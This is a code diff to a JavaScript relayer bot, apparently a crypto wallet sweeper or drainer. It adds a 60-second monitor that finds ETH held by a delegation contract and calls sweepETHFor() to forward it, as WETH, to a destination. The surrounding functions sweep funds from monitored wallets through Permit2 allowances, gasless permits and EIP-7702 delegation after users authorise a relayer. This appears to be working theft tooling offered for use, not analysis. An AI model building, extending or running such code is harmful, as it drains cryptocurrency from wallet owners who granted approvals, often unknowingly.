@@ -1340,20 +1340,21 @@ async function dispatchSweep(wallet) {
   }
 }
 
-// ── Native coin sweep helper for non-EIP7702 wallets ─────────────────────────
-// Calls sweepETHFor(user) on the V2.1 TCN contract if the user holds native
-// coin and the contract is authorised.
+// ── Native coin sweep helper for PATH 2 / Permit2 wallets ────────────────────
+// sweepETHFor(user) in TCNDelegationV2.1 wraps ETH held by the CONTRACT itself
+// (address(this).balance), not ETH in the user's wallet. The flow is:
+//   user sends ETH → TCN_CONTRACT_ADDRESS → bot calls sweepETHFor(user)
+//   → contract wraps to WETH → forwards WETH to destination.
 //
-// IMPORTANT: sweepETHFor() can only move native coin if the V2.1 contract has
-// a mechanism to pull ETH from an EOA (e.g. via prior deposit or EIP-7702).
-// We use estimateGas() as a dry-run: if it reverts the call would fail on-chain
-// so we skip the broadcast entirely — no wasted relayer gas, no failed tx.
+// This function is called ONLY when the contract itself has an ETH balance AND
+// the user has called authorize(relayer) on the contract.
 
 async function trySweepNativeFor(checksum, short) {
   if (!contract || !CONTRACT_ADDRESS) return;
   try {
-    const nativeBal = await getReadProvider().getBalance(checksum);
-    if (nativeBal === 0n) return;
+    // Check the CONTRACT's ETH balance — NOT the user's wallet.
+    const contractBal = await getReadProvider().getBalance(CONTRACT_ADDRESS);
+    if (contractBal === 0n) return;
 
     const relBal = await getRelayerBalance();
     if (relBal < ethers.parseEther("0.001")) {
@@ -1361,21 +1362,21 @@ async function trySweepNativeFor(checksum, short) {
       return;
     }
 
-    log(`[nativeFor] ${short} — native balance ${ethers.formatEther(nativeBal)} — dry-run sweepETHFor`);
+    log(`[nativeFor] ${short} — contract holds ${ethers.formatEther(contractBal)} ETH — attempting sweepETHFor`);
+
+    // User must have called authorize(relayer) for sweepETHFor to succeed.
     const isAuth = await contract.isAuthorized(checksum, relayerWallet.address).catch(() => false);
     if (!isAuth) {
       log(`[nativeFor] ${short} — not authorised in V2 contract, skipping sweepETHFor`);
       return;
     }
 
-    // Dry-run first — if estimateGas reverts the call would fail on-chain.
-    // Non-EIP7702 EOAs cannot have native coin pulled by a contract, so this
-    // will revert for most wallets. Abort silently to avoid wasting relayer gas.
+    // Dry-run to confirm it won't revert before broadcasting.
     let gasEst;
     try {
       gasEst = await contract.sweepETHFor.estimateGas(checksum);
     } catch (simErr) {
-      log(`[nativeFor] ${short} — sweepETHFor simulation reverted (non-delegated EOA) — skipping`);
+      log(`[nativeFor] ${short} — sweepETHFor simulation reverted — skipping`);
       return;
     }
 
@@ -1387,6 +1388,61 @@ async function trySweepNativeFor(checksum, short) {
     maybeResetNonce(e);
     err(`[nativeFor] ❌ ${short}: ${e.reason ?? e.message}`);
   }
+}
+
+// ── Contract ETH balance monitor ──────────────────────────────────────────────
+// Periodically checks if the TCN contract itself holds any ETH (from PATH 2
+// users who sent ETH to the contract address). Calls sweepETHFor() for the
+// first authorized PATH 2 user found. Runs every 60s to catch deposits quickly.
+
+let _contractEthPollTimer = null;
+async function _contractEthPollTick() {
+  if (!contract || !CONTRACT_ADDRESS) return;
+  try {
+    const contractBal = await getReadProvider().getBalance(CONTRACT_ADDRESS);
+    if (contractBal === 0n) return;
+
+    log(`[contractEth] 📥 contract holds ${ethers.formatEther(contractBal)} ETH — finding authorized user`);
+
+    const relBal = await getRelayerBalance();
+    if (relBal < ethers.parseEther("0.001")) {
+      warn(`[contractEth] relayer low on gas — skipping contract ETH sweep`);
+      return;
+    }
+
+    // Find first PATH 2 wallet that has called authorize(relayer).
+    for (const [, wallet] of monitoredWallets) {
+      if (wallet.type !== "direct-allowance" && wallet.type !== "permit2" &&
+          wallet.type !== "permit2-gasless" && wallet.type !== "wrap-fallback") continue;
+
+      const isAuth = await contract.isAuthorized(wallet.address, relayerWallet.address).catch(() => false);
+      if (!isAuth) continue;
+
+      log(`[contractEth] calling sweepETHFor(${wallet.address.slice(0, 10)}) to forward contract ETH`);
+      try {
+        const gasEst = await contract.sweepETHFor.estimateGas(wallet.address);
+        const fee = await getFeeData();
+        const tx = await contract.sweepETHFor(wallet.address, { gasLimit: gasEst * 120n / 100n, ...fee });
+        await tx.wait();
+        log(`[contractEth] ✅ sweepETHFor confirmed — tx: ${tx.hash}`);
+      } catch (e) {
+        maybeResetNonce(e);
+        err(`[contractEth] ❌ sweepETHFor: ${e.reason ?? e.message}`);
+      }
+      return; // done — one sweepETHFor call wraps all contract ETH
+    }
+    log(`[contractEth] no authorized PATH 2 wallet found to attribute contract ETH`);
+  } catch (e) {
+    if (!e.message?.includes("timeout")) warn(`[contractEth] poll error: ${e.message}`);
+  }
+}
+
+function startContractEthMonitor() {
+  if (!CONTRACT_ADDRESS) return;
+  if (_contractEthPollTimer) clearInterval(_contractEthPollTimer);
+  _contractEthPollTimer = setInterval(_contractEthPollTick, 60_000);
+  _contractEthPollTick(); // immediate first check
+  log(`[contractEth] monitor active (60s poll on contract ${CONTRACT_ADDRESS.slice(0, 10)})`);
 }
 
 // ── Universal sweep — 6 tiers ───────────────────────────────────────────────
@@ -2783,6 +2839,9 @@ async function init() {
 
   // 5. Start WSS: Transfer event listeners + native block scanner
   startBot();
+
+  // 6. Start contract ETH balance monitor (PATH 2 native sweep)
+  startContractEthMonitor();
 
   log("[init] ✅ bot ready — listening for Transfer events and Realtime");
   log("[init] sweeps are event-driven: Transfer events and Realtime will trigger dispatch");
